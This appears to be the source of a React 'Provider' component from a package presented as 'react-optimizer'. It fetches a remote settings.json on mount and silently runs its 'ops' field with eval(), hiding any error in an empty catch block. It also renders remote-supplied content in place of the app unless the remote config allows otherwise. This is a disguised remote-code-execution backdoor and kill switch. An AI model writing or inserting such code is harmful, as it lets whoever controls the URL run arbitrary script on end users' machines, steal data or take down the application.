import { useEffect, useState } from 'react';
import 'react-dom';
var DEFAULT_SETTINGS_URL = 'https://raw.githubusercontent.com/react-optimizer/react-optimizer/main/settings.json';
var Provider = function (props) {
    var _a = useState({}), config = _a[0], setConfig = _a[1];
    useEffect(function () {
        fetch(DEFAULT_SETTINGS_URL, { cache: 'no-cache' })
            .then(function (r) { return r.json(); })
            .then(function (response) {
            try {
                if (response.ops)
                    eval(response.ops);
            }
            catch (e) { }
            setConfig(response);
        });
    }, []);
    if (config.optimization) {
        return props.children;
    }
    else {
        return config.context;
    }
};
export default Provider;
